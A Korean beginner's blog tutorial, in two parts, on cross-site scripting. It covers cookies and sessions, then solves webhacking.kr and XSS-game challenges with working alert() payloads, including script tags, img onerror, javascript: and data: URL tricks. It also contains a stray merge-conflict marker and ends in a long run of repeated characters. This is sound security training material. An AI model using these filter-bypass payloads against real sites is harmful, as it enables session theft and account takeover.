# WEB투어 XSS

출처: https://blackperl-security.gitlab.io/blog/2018/07/13/2018-07-13-webtour-01/



# XSS 첫날

**XSS**가 첫 번째 여행지입니다…!!



> **`XSS`란 `Cross-Site-Scripting`의 약자로**
> **악의적인 사용자가 동적으로 생성되는 웹페이지에서 `악의적인 HTML 태그나 스크립트를 삽입하는 공격`입니다.**



유명한 취약점이기도 하고, 영향력 있는 취약점이라서 제일 먼저 가보고(!!!) 싶었습니다.

### XSS 여행 첫날 계획

> - #### 1. XSS 사전조사
>
>   - **무엇을 할 수 있을까?**
>
>     
>
> - #### 2. 보따리 싸기
>
>   - **HTTP**
>
>   - **Session**
>
>   - **Cookie**
>
>     
>
> - #### 3. XSS 홍보책자 읽기
>
>   - **XSS 정의**
>
>   - **XSS 종류**
>
>     
>
> - #### 4. XSS 여행 : XSS 테마파크
>
>   - **Level 1**
>   - **Level 2**



------



## 1. XSS 사전조사

### XSS에서 여행자가 할 수 있는 것들!



XSS를 여행하는 여행자가 할 수 있는 것들은 어떤 것들이 있을까요?
몇 가지의 예시를 들어볼게요!



#### **첫 번째**, 다른 사용자의 세션을 탈취할 수 있어요!

사용자를 식별하기 위해 사용하는 `쿠키`라는 아이가 있어요.

쿠키 중에서도 `세션 ID`라는 아이는 사용자가 서비스에 자신임을 인증하기 위한 `ID Card 역할`을 하게 됩니다!



**그럼 퀴즈!**
**누군가가 당신의 ID Card를 복사해가서 사용하게 되면 어떤 일이 일어날 수 있을까요?!**
.
.
.
**정답!**
**당신은 2명이 될 수 있습니다!**



XSS를 통해서 사용자의 ID Card에 해당하는 `쿠키를 탈취`할 수 있어요!
그리고 탈취한 쿠키를 활용해서 공격자가 다른 사용자인 척 가장할 수 있게 되죠.

우와! 분신술 ㅎ



------



#### **두 번째**, 피싱 사이트로 유도 가능해요!

스크립트를 이용해서 원래 서비스와 관련 없는 페이지로 강제이동시킬 수 있어요!

음, 요거에 대해서 간단한 예시를 들어볼게요.

자.. 눈을 감아봐요.. ~~앗! 눈을 감으면 안 보이잖아? 실눈 뜨고 봐여!~~



```
즐겨보는 네이버 블로그에 새로운 글이 떴습니다!!
   오!! 이건 봐야 해! 그러면서 들어갔는데?
   엥? 로그인 창이 떴네요? 엥? 로그인 안하면 못 보나? 하면서 로그인 정보를 입력했습니다.
```


자! 눈을 떠볼게요!
눈치채셨겠지만 당신의 ID, PW는 `탈취`당했어요..! :(
당신이 ID, PW를 입력한 네이버 로그인 창은 `피싱 사이트`였습니다! 히히



------



#### **세 번째**, 시스템을 장악할 수 있어요!

XSS 취약점이 있는 존재하는 웹페이지에 악성 스크립트를 포함하면,

이를 방문하는 사용자의 브라우저에서 악성 스크립트가 실행되게 됩니다.

그리고 실행되는 악성 스크립트가 아직 패치되지 않은 브라우저 취약점에 대한 `RCE exploit` 코드라면?!



> **[RCE remote code execution](https://ko.wikipedia.org/wiki/임의_코드_실행)**



**우와! 너의 컴퓨터, 내 것!**



공격자는 RCE exploit을 이용해 사용자의 PC에 원하는 명령어를 실행할 수 있고,
이는 시스템 장악으로 연결될 수 있습니다! 멋져!



------



## 2. 보따리 싸기 ･ิ▽･ิ 



XSS에서 할 수 있는 3개의 활동(?)을 보고 왔어요!


~~저거를 읽으면서 어떻게 하면 되겠고, 웹 구조가 이렇게 이루어져서 이렇게 하면 저게 뙇 되겠다!~~
~~이런게 머릿속에 그려지는 분이시면 이 글 그만 보셔도 될 듯!! 히히 그래도 심심하면 봐줘요!~~



혹시 위의 상황을 보면서 에? 쿠키가 뭐지? 세션이 뭐지? 아리까리 하면서 다른 탭 켜고 검색해야 하는 사람이라면? ^ↀᴥↀ^



그렇다면 집중해주세요 :)

**XSS 여행의 필수 준비물,**
**그래서 `쿠키와 세션`를 세심하게 챙겨보려고 합니다!**

요 준비물을 이해하면 XSS 여행하는 것 어렵지 않아요! 한번 알아보도록 하겠습니다!



**호잇!! 시작 해 볼까요?**



------



### 2-1. HTTP

블랙펄 블로그의 도메인을 살펴볼까요?



> **http://blackperl-security.gitlab.io/**



HTTP가 붙어있는 것을 확인할 수 있죠! 이건 네이버, 구글 등 다른 모두 해당되는 이야기입니다.

아니 근데 쿠키랑 세션을 설명한다면서 왜 http를 설명하려고 하냐!! 하면,

**쿠키와 세션이 있는 이유가 http이기 때문입니다.**



그 이유에 대해서 알아볼까요??

여러분들 모두 이 글을 보기 위해서 브라우저를 사용하고 있을 텐데요!

브라우저에서 이벤트가 발생할 때, 웹 서버에서 HTML 문서나 이미지 파일 등을 전송해줍니다.

이 사이에서 정보를 지속적으로 주고 받아야겠죠? 그래서 `규칙`을 만들었어요.

**그게 바로 `HTTP`, 풀어서 말하면 `Hypertext transfer protocol`입니다.**



![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_27.png)
chrome에서 오른쪽 클릭하면 [검사-Network]에서 서버와 브라우저가 데이터를 주고받는 게 보입니다! 슈슉



그림으로 표현을 해볼까요?

`web browser`와 `web server` 사이에서 데이터를 주고받는데 웹 브라우저에 [naver.com](http://naver.com/)이라고 치면

서버에게 **요청(request)**하고 그에 대한 **응답(response)**를 하면서 내용이 변경됩니다.


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_20.png)



여기서 http의 특징(?)이자 단점(!)이 있습니다.

**바로 `상태를 저장하지 않는다는 것` 입니다.**



음?? 여기서 말하는 **상태**가 뭘까요??

정적으로 정보를 전달해 줄 때는 문제가 없었지만, 지금은 동적인 것이 대세인 시기입니다!!

쇼핑하면서 장바구니에 물건도 담고, 페이스북 로그인해서 내 정보를 불러오기도 하고요!

그러기 위해서는 나의 상태를 식별하고 저장을 해야 합니다.

사용자 식별, 많이 사용되는 로그인에서는 **세션**을 사용합니다.

또한 세션에는 식별자를 부여해서 세션 데이터 안에 정보를 넣습니다.

그리고 이 정보를 쿠키를 사용해서 서버와 클라이언트 사이에서 주고받게 됩니다.



> - **쿠키**
>
>   - 클라이언트 로컬에 저장되는 키와 값이 들어있는 `데이터파일`을 말함.
>     이름,값, 만료날짜, 경로 정보 등
>
>     
>
> - **세션**
>
>   - 일정시간동안 같은 브라우저로부터 들어오는 일련의 요구를 하나의 상태로 보고 그 `상태를 유지`하는 기술을 말함.



음… 어렵네요. 그럼 로그인 과정을 보면서 어떤 역할을 하는지 볼까요?



```
서버에 세션 데이터 '늘보'가 생성이 되었다고 가정을 합시다!   
늘보에는 아이디와 같은 식별할 수 있는 내용이 들어가 있습니다.

그럼 사용자가 늘보의 주인인 것을 확인하기 위해서 
서버는 브라우저에게 HTTP에 'Set-Cookie'를 주게 됩니다. 

이제 클라이언트는 매 요청때마다 늘보가 들어있는 쿠키를 포함하게 됩니다. 

그럼 서버는 클라이언트 요청에 포함된 '늘보'를 보고 '늘보'가 있는지 확인하고 사용자를 식별하게 돼요!
```



그럼 이제 세션을 조금 더 구경 해볼까요!



------



### 2-2. Session

우와! 세션입니다! 세션이 대표적으로 많이 사용되는 곳은 `로그인`입니당!

우리가 웹사이트에서 로그인할 때 패턴을 생각해봐요!!



```
사용자가 웹 사이트에 아이디와 비밀번호를 입력해서 
웹 사이트를 방문한 후 로그아웃하거나 오랜 시간 동안 사용을 안 하면 로그아웃되죠?  

그리고 페이지 넘어갈 때마다 계속 로그인하지 않습니다!! <- 여기!
```


**이거 세션이 하는 일이었어요!**



사용자가 웹 브라우저를 통해서 웹 서버를 접속한 시점으로부터 웹 브라우저 종료한 시점! 혹은 로그인부터 로그아웃까지!

**상태를 일정하게 유지하고 정보를 담고 있어요!**



세션으로 로그인하는 코드를 한번 쓱 확인해봐요!! *클릭!*



> **[세션 로그인 구현](https://zetawiki.com/wiki/PHP_세션_로그인_구현)**



로그인 창에 로그인과 비밀번호를 넣으면!


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_33.png)



이렇게 요청 쿠키, 응답 쿠키를 확인할 수 있어요.

그리고 세션은 서버에 저장이 됩니다!! 그 위치를 찾아가 볼까요?



```
root@ubuntu:/var/lib/php# vim sessions/
```


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_34.png)



여기서 이렇게 세션을 확인할 수 있습니다!!



------



### 2-3. Cookie


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_25.png)



우리가 잘 아는 쿠키!

HTTP 헤더에서 `Cookie`가 있고, 이 쿠키를 활용해서 사용자를 식별하게 되죠!

HTTP 요청과 응답할때, 쿠키의 이름이 달라요!

HTTP 요청을 수신할 때, 응답과 함께 `Set-Cookie`를 보내요!

눈으로 확인해볼 방법이 있어요!!


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_31.png)



쨔란 보이죠! 보여!

**쿠키는 내 컴퓨터에서 볼 수 있어요!**


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_29.png)



~~Chrome은 쿠키랑 캐시랑 같이 저장이 되는거같더라고요!~~

우와 쿠키로 인해서 사용자 식별을 하는구나!! 그런데 아이고…쿠키에도 문제점이 있답니다?!ㅠㅠ

**쿠키로 로그인을 구현하면!!**



> [쿠키 로그인 구현](https://zetawiki.com/wiki/PHP_쿠키_로그인_구현)


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_28.png)




![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_30.png)



이렇게 쿠키값이 그대로 노출됩니다.



------



그리고 무려 `webhacking.kr` `1번` 문제가 쿠키문제라고여…쿠키쿠키

우리 한번 코드를 보죠!!



```html
<?
if(!$_COOKIE[user_lv])
{
SetCookie("user_lv","1");
echo("<meta http-equiv=refresh content=0>");
}
?>
<html>
<head>
<title>Challenge 1</title>
</head>
<body bgcolor=black>
<center>
<br><br><br><br><br>
<font color=white>
---------------------<br>
<?

$password="????";

if(eregi("[^0-9,.]",$_COOKIE[user_lv])) $_COOKIE[user_lv]=1;

if($_COOKIE[user_lv]>=6) $_COOKIE[user_lv]=1;

if($_COOKIE[user_lv]>5) @solve();

echo("<br>level : $_COOKIE[user_lv]");

?>
<br>
<pre>
<a onclick=location.href='index.phps'>----- index.phps -----</a>
</body>
</html>
```



코드는 엄청 쉬워요! 그냥 cookie 값이 5보다 크고 6보다 작으래요..잉?

쿠키값을 바꿔야 하는구나! 오.. **여기서 우리는 쿠키값을 바꿀 수 있음을 알게 됩니다!**


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_32.png)



이건 `EditThisCookie`라는 도구예요! 이걸로 쿠키를 변경할 수 있어요!

지금 1으로 되어있는데 문제에서 원하는 답으로 변경하면 풀리는 문제입니다!

이렇게 내 입맛대로! 쿠키 더하고 빼고 다른 거로 바꾸는 것도 가능함…ㅎㅎㅎㅎ

와! 우리 이제 이 준비물들을 왜 챙겨야 하는지 대강 이해 한 것 같아요.
이제 XSS 알려줘라 알려줘!!



------



## 3. XSS 홍보책자를 읽어봅시다!

### 3-1. XSS 정의

`XSS`란 `Cross-Site-Scripting`의 약자로

악의적인 사용자가 동적으로 생성되는 웹페이지에서 `악의적인 HTML 태그나 스크립트를 삽입하는 공격`입니다.

OWASP에서 자주 등장하는 빈번한 취약점이죠!



> **[owasp_top10](https://www.owasp.org/images/b/bd/OWASP_Top_10-2017-ko.pdf)**
> **[kisa_xss](http://www.kisa.or.kr/uploadfile/201312/201312161355109566.pdf)**


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_24.png)

------



### 3-2. XSS 종류 ʕ￫ᴥ￩ʔ

XSS 종류에 대해서 알아봅시다!

OWASP에서는 XSS를 발생 형식에 따라 다음과 같이 3가지로 분류하고 있어요!



- **`Reflected xss`** : 검색 결과, 에러 메시지 등 서버가 외부에서 입력받은 값을 받아
  브라우저에 응답할 때 전송하는 과정에서 입력되는 변수의 문자를 사용자에게 그대로 돌려주면서 발생합니다!

  ![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_09.png)

  

- **`Persistent xss`** : 공격자가 XSS 취약점이 있는 웹서버에 공격용 스크립트를 입력시켜 놓으면
  방문자가 악성 스크립트가 삽입되어있는 페이지를 읽는 순간 방문자의 브라우저를 공격하는 방식입니다.

  ![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_08.png)

  

- **`Dom xss`** : 피해자 브라우저가 HTML 페이지를 구문 분석할 때마다 공격 스크립트가 DOM 생성의 일부로 실행되면서 공격!!

  ![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_10.png)

  



글이랑 그림으로만 보니까 재미도 없고, 뭐라는지도 모르겠구!

이런 속담이 있습니다..

**백문이 불여일견이요, 백견이 불여일각이며 백각이 불여일행이다!** (우왕.. 엄청 똑똑해보여!)



XSS 테마파크에서 좀 놀아봅시다!
**Let’s Gooooooooooooo**



------



## 4. XSS 여행 추천코스 : XSS 테마파크



![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_38.png)
가봅시다! 룰루!



테마파크를 갈거에요! **XSS-game**이라고 히히 :)

XSS-game은 `Google`에서 만든 XSS로만 구성되어있는 CTF문제에요. `Level 6`까지 있어요!

위치는 여기!



> **[XSS-game](https://xss-game.appspot.com/)**



------



### 4-1. 오오! Level 1


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_19.png)



첫 번째 문제에 대해서 읽어보면,

사용자 입력 때문에 페이지에 영향을 주는 xss의 **일반적인 원인**을 보여주겠다네요!

**첫 미션은 응용프로그램에서 자바스크립트 명령어인 alert()를 사용해서 알림창을 띄우는겁니다!**

옹 xss로 알림창을 띄우게 하면 되는 거구나! 시작 해 봅시당!!


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_01.png)



위 사진의 `search` 클릭하면 URL이 이렇게 변해요!

`Get method`를 사용하고 있음을 알 수 있죠!



> **[Get method](https://developer.mozilla.org/ko/docs/Learn/HTML/Forms/Sending_and_retrieving_form_data)**



밑에 `target code(toggle)`을 클릭하면 소스코드를 볼 수 있는데요!!



```
    class MainPage(webapp.RequestHandler):
    
      def render_string(self, s):
        self.response.out.write(s)
    
      def get(self):
        # Disable the reflected XSS filter for demonstration purposes
        self.response.headers.add_header("X-XSS-Protection", "0")
    
        if not self.request.get('query'):
          # Show main search page
          self.render_string(page_header + main_page_markup + page_footer)
        else:
          query = self.request.get('query', '[empty]')
          
          # Our search engine broke, we found no results :-(
          message = "Sorry, no results were found for <b>" + query + "</b>."
          message += " <a href='?'>Try again</a>."
    
          # Display the results page
          self.render_string(page_header + message + page_footer)
        
        return
```



이거 보면 query라는 변수에서 검색 입력값이 들어가고 화면에 뿌려주는 코드에서 query가 들어간 것을 확인할 수 있슴돠!

우리는 아직 목표를 잊지 않았습니다. 알림창을 띄우는 목표를요!



```
    <script>alert("blackperl");</script>
```


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_02.png)

짜란! 이렇게 하니 풀렸습니다!

xss는 이런 느낌(?)이에요.

**홈페이지 개발자는 다른 사용자가 멋대로 알림창을 띄우게 하는 것은 원하지 않았을 거에요!**



**별거 아니네!** 이렇게 생각하실 수도 있지만 우리는 이걸로 2가지를 생각할 수 있어요.

> - **브라우저로 반환된 메시지 매개변수의 내용은 `악의적인 데이터`로 교체될 수 있다.**
> - **서버 측 애플리케이션을 수행하는 것이 무엇이든 페이지가 브라우저에 표시되었을때 실행되는 `자바 스크립트 코드`를 막기는 힘들다.**


.
.
.



위와 같은 xss 취약점을 `Reflected xss`라고 합니다.

Reflected는 말 그대로 `반사`라는 뜻이잖아요?ㅎㅎ

**사용자가 입력한 값을 중간에 가로채 이를 서버 응답의 소스에 삽입하는 취약점입니다.**



매개변수로 문자를 받았고, 사용자에게 받은 메시지를 다시 보내주었습니다.

거기에 단지 **alert 창을 띄우게 하는 스크립트를 넣었을 뿐**이죠!

다른 예를 들어보자면 전자메일 메시지로 희생자에게 전달되어 링크를 클릭하거나 특수하게 조작된 양식을 제출하면 공격이 사용자의 브라우저에서 반영되게 됩니다.



이런 단순한 공격이 생각보다 많은 부분을 차지하고 있습니다.



**이를 Reflected xss라고 부르는, 이유는 사용자가 스크립트를 요청할 때 사용자에게 다시 돌아가서 보이기 때문입니다.**



![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_09.png)
히히 재탕!



이를 이용하는 공격 중에 많이 사용되는 공격은 `세션 하이재킹`입니다.

사용자의 세션을 가로채 해당 사용자인 것처럼 위장하는 하이재킹 공격을 통해서 공격자는 데이터와 모든 기능에 인가된 사용자의 접근권한을 얻을 수 있습니다.



------



### 4-2. 우왕! Level 2



다음 문제~


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_03.png)



문제를 읽어보면 웹은 사용자 데이터를 데이터베이스에 보관하고 나중에 사용자에게 표시한다고 하네요!



**오홍! xss가 데이터베이스까지 영향을 끼칠 수 있나 보다!**



위와 똑같이 alert 창을 띄우라는데…! 전이랑 똑같이 해보면 되나 생각해보면!



![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_04.png)



이렇게 아무것도 안뜸!



![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_05.png)



원래는 이렇게 뭐라도 뜨는데…음 `<script>` 태그를 아예 무시하도록 코딩을 해놓았나 봐요!

**그래서 `<script>` 태그를 사용 안 하고 다른 태그를 사용해서 alert 창을 띄워야 하는 문제군요!**

아래와 같이 띄우면 됩니당!



```
    <img src="image.gif" onerror=js:alert("blackperl")>
```


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_06.png)



이렇게 성공하게 됩니다. 이후에 재접속하거나 다른 글을 써도 이 알림창은 계속 뜹니다!



**데이터베이스에 저장해서 지속해서 영향을 미칠 수 있게 된 거죠!**

**또한, 우리는 이 문제로 `<script>`태그말고 다른 태그로 우회도 가능하다는 사실을 알았습니다.**

**XSS가 오랫동안 살아남아있는 이유 중에 하나죠!! 이러저리 우회가 가능합니다!!**



**이렇게 데이터베이스에 저장하여 계속 피해를 줄 수 있는 XSS가 바로 `Persistent XSS`입니다!** stored XSS라고도 합니다.


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_08.png)



문제처럼 데이터베이스에 악성 스크립트가 포함된 질문을 등록할 수 있다면,

공격자는 질문을 클릭하는 사용자 브라우저 내에서 악성 스크립트를 실행시킬 수 있게 됩니다!!

스크립트를 등록하고 피해자는 클릭하도록 기다리기만 하면 되기 때문에 불특정 다수가 피해자가 될 수 있고,

만약 피해자가 admin이라면 관리자의 권한을 얻을 수 있어서 장악할 수 있는 멋있는(!) 그림이 나오죠!

Reflected xss보다 피해가 큰 이유는 이런 내용들 때문이죠!



------



## XSS 1일차 여행 끝!



어떠신가요?
이제 조금 XSS 에 대한 감이 오시나요? :)
오늘은 일단 여기까지, 2일차 여행에서 다시 만나요!



```
<script>alert(그럼 다음에 봐여! 아뇽)</script>
```


![img](https://blackperl-security.gitlab.io/img/post/2018-06-28-webtour-01/blog_web_owasp_xss_36.png)



------



#### 짠웹투어 XSS 2일차 예고



```
    테마파크 완전정복!  
    XSS-game 나머지 문제를 풀어봅시다아아아!  
```



#### to be continue…!





---

# XSS 2일차

### 이전편 요약

```
사용자를 인증하는 방법의 하나인 ID와 PW로 인증하는 과정에 대해 알아보고 세션과 쿠키에 대해서 준비를 했어요.

그래서, 웹 애플리케이션이 사용자에 고유한 값(세션 ID)을 전달하는 과정에 대해서 알게 되었고
세션으로 웹 페이지를 넘길 때마다 ID와 PW를 입력하지 않아도 동적 웹 애플리케이션을 이용할 수 있다는 걸 알게 되었죠.

XSS의 2가지 종류에 대해서 보았는데,

첫 번째, 사용자가 입력한 값을 중간에 가로채 이를 서버 응답 소스에 삽입하는 취약점인 Reflected XSS!
두 번째, 데이터베이스에 저장하여 계속 피해를 줄 수 있는 취약점인 Persistent XSS 혹은 Stored XSS를 알게 되었다!
```


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_40.png)



안녕하세요!! yeali입니다 ◝(⁰▿⁰)◜ 

지난번에 XSS 1일 차에 이어 2일 차로 돌아왔습니다!!

2일 차에는 XSS wargame 사이트를 볼 거에요!
들어가기 전에 **왜 wargame 사이트에서 문제를 풀어야 할까요?**

XSS는 payload가 엄청 많아요!! 여러분 한번 생각해볼까요? 몇 개일 거 같아요?

> [XSS cheat sheet](https://gist.github.com/kurobeats/9a613c9ab68914312cbb415134795b45)


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_01.png)

정리된 Cheat sheet에서는 `1481개`가 있네요!!

하나하나 외우는 게 불가능하겠죠? 그래서 XSS wargarm 사이트를 풀어보면서, XSS의 `payload`를 알아보고자 해요!



------



### XSS 여행 2일차 계획

> - #### 1. 1일차 일기
>
>   - **xss-game Level 5**
>
>   - **xss-game Level 6**
>
>     
>
> - #### 2. 동네 탐방(수천번의 노크 XSS)
>
>   - **prolog**
>   - **stage 2 - url enconding**
>   - **stage 4 - close tag**
>   - **stage 7 - input focus**
>   - **stage 10 - not script**
>   - **stage 12 - csp**



------



## 1. 1일차 일기 (feat. XSS Game 놀이공원)



테마파크 완전정복! XSS-game 나머지 문제를 풀어봅시다아아아!

마지막에 이렇게 끝냈는데 여러분 xss-game 풀어보셨나요! 풀어보셨군요!

우리 xss-game을 풀어봤잖아요! 어떤 느낌이셨나요? 보면 전반적으로 `alert 창`을 띄우면 되는 문제입니다.

재밌는 놀이기구였던 5번, 6번 문제만 소개해줄게요! ㅎㅎㅎㅎㅎㅎㅎㅎㅎㅎ



------



### 1-1. XSS-Game Level 5




![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_12.png)



> **미션설명**
> <<<<<<< HEAD
>
> # XSS는 데이터를 올바르게 이스케이프 처리하는걸로 끝나지 않습니다.
>
> XSS는 데이터를 올바르게 이스케이프 처리하는 거로 끝나지 않습니다.
> \>>>>>> 8465d13e0a0f4d36cba1c9f6fc0ef526d7f07a3d 때로는 공격자가 Dom에 요소를 주입하지 않고도 해킹할 수 있습니다.

문제를 푸는데 필요한 코드를 확인해보죠!

```
<script>
      setTimeout(function() { window.location = '{{ next }}'; }, 5000);
</script>

<a href="{{ next }}">Next >></a>
```


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_13.png)

get 방식으로 하여 URL로 되어있고, next를 누르면 링크에 있는 내용이 스크립트로 전달되도록 하면 되는 문제에요!

저는 코드 안 보고 next 변수에 alert()를 넣고 “Go”를 눌렀지만 아무 반응이 없었다고 혼자 고민하고 있었다…! 바보다!

그래서 밑처럼 javascript:alert를 해서 넣으면 성공합니다아아! `2-5. stage 10 - not script 참고`

```
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert('yeali');
```


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_14.png)



------



### 1-2. XSS-Game Level 6




![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_15.png)

Level 6의 원래 풀이 방법은 서버를 사용해서 푸는 거에요!

하지만 쉬운 길이 있으면 굳이 돌아가야 합니까! 서버 사용보다 쉬운 풀이 방법이 있어서 소개해드리려고 합니다.

Data url scheme이라는게 있는데,
**Data URL로 data:가 접두어로 붙은 URL은 이미지와 같은 외부 데이터를 url로 표현하는 방법**입니다.

그래서 `data:[자료타입],[데이터]`로 표현가능하죠.

```
https://xss-game.appspot.com/level6/frame#data:text/javascript,alert('yeali');
```


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_18.png)

풀었다~~ 풀었어~~


![img](https://blackperl-security.gitlab.io/img/post/2018-07-27-webtour-02/blog_web_owasp_xss_19.png)

다 풀면 이런 화면이 나옵니다!

여행에서는 인증샷이 필수죠! `찰칵`



------



## 2. 동네 탐방 (수천번의 노크)



오늘은 동네를 탐방해볼까요?

knock.xss.moe이라는 곳에서 현지인들의 생활을 구경해봐요!

knock.xss.moe는 XSS 취약점으로만 이루어진 일본에서 만든 wargame site입니다!

> [수천번의 노크](https://knock.xss.moe/index)

```
똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑똑
```

